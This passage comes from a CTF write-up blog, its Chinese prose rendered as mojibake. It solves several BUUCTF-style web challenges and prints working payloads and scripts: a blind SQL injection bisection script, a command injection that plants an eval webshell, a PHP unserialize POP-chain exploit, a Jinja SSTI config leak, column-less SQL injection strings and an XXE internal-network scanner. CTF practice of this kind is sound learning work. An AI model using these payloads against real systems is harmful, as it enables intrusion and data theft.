alt="image-20260205133817457"></p><p>è¿‡æ»¤äº†è®¸å¤šä¸œè¥¿ï¼Œunionæ³¨å…¥åæ­£æ˜¯ä¸å¯ä»¥çš„äº†ï¼Œè¯•è¯•å¸ƒå°”ç›²æ³¨ï¼Œè¿™ä¸ªä¸»è¦å¾—å…³æ³¨é¡µé¢çš„å›æ˜¾ï¼Œå‘ç°id&#x3D;1çš„æ—¶å€™å›æ˜¾æ˜¯ç‰¹æ®Šçš„ï¼è™½ç„¶æ²¡æœ‰andå’Œoräº†ï¼Œç©ºæ ¼ä¹Ÿæ²¡äº†ï¼Œä½†æ˜¯å¯ä»¥å†™å‡ºä¸‹é¢çš„payload</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#x27;f&#x27;),1,2)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨()å»ç»•è¿‡ç©ºæ ¼çš„è¿‡æ»¤ï¼Œå¿«é©¬åŠ é­ç›´æ¥è„šæœ¬èµ°èµ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://4dbddb56-c028-4c0b-92a9-61a56c03ab6b.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,2)&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        res = requests.post(url,data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;glzjin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç©æ„ç¬¬ä¸€æƒ³æ³•åˆ©ç”¨ç®¡é“ç¬¦é€ƒé€¸ï¼Œä½†æ˜¯ä¸è¡Œï¼Œçœ‹åˆ°ä¸¤ä¸ªè½¬ä¹‰çš„å‡½æ•°ï¼Œå°±æƒ³åˆ°çš„æˆ‘ä¹‹å‰å†™çš„ä¸€ç¯‡æ–‡ç« </p><p><a href="https://blog.csdn.net/2403_88003384/article/details/153657044?spm=1001.2014.3001.5501">escapeshellargä¸escapeshellcmdçš„å¼„å·§æˆæ‹™-CSDNåšå®¢</a></p><p>ç„¶åå°±æ˜¯çš„ï¼Œä¹‹åå†™å…¥æœ¨é©¬</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; &lt;?=@eval(<span class="built_in">$</span><span class="built_in">_</span>POST[1]);?&gt; -oN shell.phtml &#x27;</span><br></pre></td></tr></table></figure><p>è®¿é—®æ˜¯ä¸‹è½½ï¼Œé‚£ä¹ˆå°±æ˜¯æ²¡è§£æäº†ï¼Œæ€€ç–‘ä¸¤ä¸ªæ–¹é¢ï¼Œä¸€æ˜¯è¿™ä¸ªç›®å½•æ²¡æ‰§è¡Œæƒé™ï¼Œè€Œæ˜¯æœ¬æ¥å°±ä¸è§£æphtml</p><p>äºæ˜¯æˆ‘åŠ å…¥äº†xffå¤´å¹¶ä¸”æŠŠphtmlæ”¹æˆäº†phpè¿™æ ·å°±ä¸¤ä¸ªæ–¹é¢éƒ½è€ƒè™‘äº†ï¼Œæœç„¶å¯ä»¥ï¼Œrceæ‹¿flagå³å¯ï¼</p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>æœ‰ç‚¹æ„æ€ï¼Œå¥½ä¹…æ²¡åšpopé“¾äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html<span class="params">#</span><span class="comment">%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  <span class="built_in">$</span>var;</span><br><span class="line">    public function append(<span class="built_in">$</span>value)&#123;</span><br><span class="line">        include(<span class="built_in">$</span>value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function <span class="built_in">_</span><span class="built_in">_</span>invoke()&#123;</span><br><span class="line">        <span class="built_in">$</span>this-&gt;append(<span class="built_in">$</span>this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public <span class="built_in">$</span>source;</span><br><span class="line">    public <span class="built_in">$</span>str;</span><br><span class="line">    public function <span class="built_in">_</span><span class="built_in">_</span>construct(<span class="built_in">$</span>file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        <span class="built_in">$</span>this-&gt;source = <span class="built_in">$</span>file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.<span class="built_in">$</span>this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function <span class="built_in">_</span><span class="built_in">_</span>toString()&#123;</span><br><span class="line">        return <span class="built_in">$</span>this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function <span class="built_in">_</span><span class="built_in">_</span>wakeup()&#123;</span><br><span class="line">        if(preg<span class="built_in">_</span>match(&quot;/gopher|http|file|ftp|https|dict|<span class="keyword">\.</span><span class="keyword">\.</span>/i&quot;, <span class="built_in">$</span>this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            <span class="built_in">$</span>this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public <span class="built_in">$</span>p;</span><br><span class="line">    public function <span class="built_in">_</span><span class="built_in">_</span>construct()&#123;</span><br><span class="line">        <span class="built_in">$</span>this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function <span class="built_in">_</span><span class="built_in">_</span>get(<span class="built_in">$</span>key)&#123;</span><br><span class="line">        <span class="built_in">$</span>function = <span class="built_in">$</span>this-&gt;p;</span><br><span class="line">        return <span class="built_in">$</span>function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset(<span class="built_in">$</span><span class="built_in">_</span>GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize(<span class="built_in">$</span><span class="built_in">_</span>GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    <span class="built_in">$</span>a=new Show;</span><br><span class="line">    highlight<span class="built_in">_</span>file(<span class="built_in">_</span><span class="built_in">_</span>FILE<span class="built_in">_</span><span class="built_in">_</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>é“¾å­çœŸçš„ç®€å•ï¼Œå…³é”®æ˜¯å¦‚ä½•è§¦å‘__toStringï¼Œè¿™é‡Œæ­»æ´»æ²¡æƒ³åˆ°æ­£åˆ™é‚£é‡Œå½“ä½œäº†å­—ç¬¦ä¸²ï¼Œå½“æˆ‘ä»¥ä¸ºä¸€åˆ‡é¡ºåˆ©çš„æ—¶å€™ç°å®åˆç»™äº†æˆ‘ä¸€å·´æŒï¼Œäºæ˜¯æˆ‘æœ¬åœ°debugå‘ç°åªè§¦å‘åˆ°ï¼ŒtoStringä¸ºå•¥ï¼Ÿæˆ‘è¾“å‡ºäº†ä¸€ä¸‹strå‘ç°æ˜¯NULLï¼Œäºæ˜¯æˆ‘æ£€æŸ¥äº†æˆ‘çš„åºåˆ—åŒ–å­—ç¬¦ä¸€é¡¿å†ç¨‹ï¼Œæˆ‘æ‰çŸ¥é“æˆ‘è§¦å‘çš„æ˜¯ç¬¬äºŒä¸ªå®ä¾‹çš„toStringï¼Œé‚£ä¸ªå®ä¾‹é‡Œé¢çš„strå°±æ˜¯NULLã€‚ä¹‹å‰æ²¡é‡åˆ°è¿‡ï¼Œæ‰€ä»¥æœ€åçš„expå°±æ˜¯</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  <span class="built_in">$</span>var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class Show&#123;</span><br><span class="line">    public <span class="built_in">$</span>source;</span><br><span class="line">    public <span class="built_in">$</span>str;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public <span class="built_in">$</span>p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">$</span>a = new Show();</span><br><span class="line"><span class="built_in">$</span>b = new Test();</span><br><span class="line"><span class="built_in">$</span>c = new Modifier();</span><br><span class="line"><span class="built_in">$</span>d = new Show();</span><br><span class="line"><span class="built_in">$</span>a -&gt; source = <span class="built_in">$</span>d;</span><br><span class="line"><span class="built_in">$</span>d -&gt; str = <span class="built_in">$</span>b;</span><br><span class="line"><span class="built_in">$</span>b -&gt; p = <span class="built_in">$</span>c;</span><br><span class="line">echo urlencode(serialize(<span class="built_in">$</span>a));</span><br></pre></td></tr></table></figure><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>ç»™äº†æºç å¾ˆæ˜æ˜¾æ˜¯ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>åœ¨å½“å‰ä½œç”¨åŸŸå°†configè®¾ç½®ä¸ºnoneäº†ï¼Œç„¶åå‘½ä»¤æ‰§è¡Œä¹Ÿä¸è¡Œï¼Œä½†æ˜¯è®¾ç½®çš„æ˜¯å½“å‰å±€éƒ¨ä½œç”¨åŸŸï¼Œæˆ‘ä»¬ä»å…¨å±€æ¥</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;current<span class="built_in">_</span>app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>current_app</code> æŒ‡å‘çš„æ˜¯å†…å­˜ä¸­çœŸå®çš„ Flask åº”ç”¨å¯¹è±¡</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>ç¬¬ä¸€æƒ³æ³•ezï¼Œå°è¯•äº†systemå’Œpassthruçš†æŠ¥500ï¼Œäºæ˜¯æœ¬åœ°æµ‹è¯•ä¹Ÿæ˜¯ä¸è¡Œï¼Œç„¶åæƒ³é”™äº†ï¼Œä»¥ä¸ºæ˜¯æ–°å§¿åŠ¿ï¼Œå…´é«˜é‡‡çƒˆçœ‹wpï¼Œæ²¡æƒ³åˆ°æœç„¶æ˜¯æˆ‘æƒ³é”™äº†ï¼Œç›´æ¥phpinfoå°±å¥½äº†ï¼Œä½†æ˜¯å‚æ•°ä¼šå½±å“è¿”å›çš„é•¿åº¦ï¼Œæ‰€ä»¥ç”¨è¿‡assertå°±okäº†</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>ä¸€ä¸ªç™»å½•æ¡†ï¼Œä½†æ˜¯æœ‰æ³¨å†Œï¼Œä¼˜å…ˆè€ƒè™‘ç™»å½•åçš„æ¼æ´</p><p>ç™»å½•ä¸Šå»æœ‰ä¸ªå‘å¸ƒå¹¿å‘Šæœ‰ä¸ªxssä½†æ˜¯åº”è¯¥æ²¡å•¥ç”¨ï¼Œä½†æ˜¯æœ‰äºŒæ¬¡æ³¨å…¥</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">é—­åˆæ–¹å¼ä¸º&#x27;ï¼Œorè¢«è¿‡æ¥ï¼Œå¯ä»¥ç”¨group byæ¥åˆ¤æ–­åˆ—æ•°</span><br><span class="line">1&#x27;/**/group/**/by/**/23,&#x27;</span><br><span class="line">1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br><span class="line">mysql.innodb<span class="built_in">_</span>table<span class="built_in">_</span>statsç”¨è¿™ä¸ªæ›¿ä»£informationé‚£ä¸ªè¡¨</span><br><span class="line">è¡¨ï¼š1&#x27;/**/union/**/select/**/1,(select/**/group<span class="built_in">_</span>concat(table<span class="built_in">_</span>name)/**/from/**/mysql.innodb<span class="built_in">_</span>table<span class="built_in">_</span>stats/**/where/**/database<span class="built_in">_</span>name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br><span class="line">æ— åˆ—åçˆ†å­—æ®µï¼š</span><br><span class="line">1&#x27;/**/union/**/select/**/1,(select/**/group<span class="built_in">_</span>concat(c)/**/from (select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)/**/as/**/a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure><p>å› ä¸ºoræ²¡äº†æ‰€ä»¥é‡‡ç”¨æ— åˆ—åæ³¨å…¥ï¼Œå‚è€ƒæˆ‘ä¹‹å‰æ–‡ç« ï¼š<a href="https://blog.csdn.net/2403_88003384/article/details/152737779?fromshare=blogdetail&sharetype=blogdetail&sharerId=152737779&sharerefer=PC&sharesource=2403_88003384&sharefrom=from_link">ä»informationè¢«banåˆ°æ— åˆ—åæ³¨å…¥-CSDNåšå®¢</a></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>ä¸€ä¸ªxmlï¼Œå¯ä»¥ä»æ¥ä¸ªè§’åº¦å‘ç°ï¼Œä¸€æ˜¯å‰ç«¯çš„jsï¼Œæˆ–è€…ä½ ç›´æ¥æŠ“åŒ…ä¹Ÿä¼šå‘ç°ï¼Œäºæ˜¯å°è¯•æœ€åŸºç¡€çš„xxeï¼Œå¯ä»¥è¯»æ–‡ä»¶ï¼Œä½†æ˜¯ä¸çŸ¥é“flagåœ¨å“ªï¼Œç„¶åè¿™é¢˜è€ƒçš„æ˜¯å†…ç½‘æ¢æµ‹</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/fib<span class="built_in">_</span>trie æ›´æœ‰ç”¨ï¼Œä½†å®ƒé€šå¸¸åªç»™ä½ ä¸€ä¸ªâ€œèŒƒå›´â€ï¼›</span><br><span class="line">è€Œ /etc/hosts å¾€å¾€æ˜¯ç©ºçš„ï¼Œé™¤éç®¡ç†å‘˜æ‰‹åŠ¨é…ç½®è¿‡ã€‚</span><br></pre></td></tr></table></figure><p>okä»¥åå°½é‡ç”¨&#x2F;proc&#x2F;net&#x2F;fib_trie</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> Timeout</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡URL</span></span><br><span class="line">url = <span class="string">&quot;http://2edd14f9-1114-42cc-9d90-1f036abfb269.node5.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯·æ±‚å¤´</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/xml, text/xml, */*; q=0.01&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://2edd14f9-1114-42cc-9d90-1f036abfb269.node5.buuoj.cn:81/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://2edd14f9-1114-42cc-9d90-1f036abfb269.node5.buuoj.cn:81/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Priority&quot;</span>: <span class="string">&quot;u=0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="comment"># è¯·æ±‚ä½“æ•°æ®</span></span><br><span class="line">    data = <span class="string">f&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE user[&lt;!ENTITY flag SYSTEM &quot;http://10.244.166.<span class="subst">&#123;i&#125;</span>&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;flag;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># å‘é€POSTè¯·æ±‚</span></span><br><span class="line">        response = requests.post(</span><br><span class="line">            url,</span><br><span class="line">            headers=headers,</span><br><span class="line">            data=data,</span><br><span class="line">            verify=<span class="literal">False</span>,</span><br><span class="line">            timeout=<span class="number">1</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># æ£€æŸ¥HTTPé”™è¯¯çŠ¶æ€ç ï¼ˆ4xx, 5xxï¼‰</span></span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ‰“å°å“åº”ç»“æœ</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;çŠ¶æ€ç :&quot;</span>, response.status_code)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å“åº”å†…å®¹:&quot;</span>, response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Timeout:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;é”™è¯¯: è¯·æ±‚è¶…æ—¶ï¼ŒæœåŠ¡å™¨æœªåœ¨æŒ‡å®šæ—¶é—´å†…å“åº”&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2020-ç„æ­¦ç»„-SSRFMe"><a href="#ç½‘é¼æ¯-2020-ç„æ­¦ç»„-SSRFMe" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe"></a>[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</h2><p>ä»¥è¿™é“é¢˜æ¥äº†è§£ä¸€ä¸‹redisä¸»ä»å¤åˆ¶ï¼Œå› æ­¤ä¸åˆ†æä»£ç </p><p><img src="/../images/achieve/2026/1/image-20260218213544251.png" 